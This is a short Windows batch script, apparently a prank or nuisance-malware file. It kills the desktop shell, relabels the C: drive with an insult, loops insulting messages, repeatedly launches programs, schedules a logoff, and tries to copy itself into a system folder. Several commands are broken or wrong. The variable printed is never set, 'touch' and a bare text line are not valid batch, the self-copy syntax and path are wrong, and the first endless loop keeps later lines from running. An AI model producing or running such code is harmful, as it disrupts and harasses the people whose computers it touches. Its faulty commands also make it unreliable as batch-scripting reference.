::close the explorer.exe

taskkill/f /im explorer.exe

::change name of disk C:

label C:Bastard

::change text color in console to red (as far, as i remember)

COLOR 05

::create variable to write it in console

set greatMessage=Fuck you, bastard.

:matrics

  ::write random numbers and our variable "message"
  
  echo %number% %number% %number% %number% %number% %number% %number% %number% %number% %number% %number% %number%
  echo %greatMessage%
  
goto matrics

:alwaysOpen
  
  ::open several programms
  
  start mspaint
  start explorer.exe
  start calc
  
goto alwaysOpen

::create file in this file's directory

touch toYou.txt

::write message in created file

Your computer will sign out of your system. > toYou.txt

::sign out from system after 60000 seconds (1000 minutes)

shutdown /l /t 60000

::copy this file in system32

copy 0% C:\System32
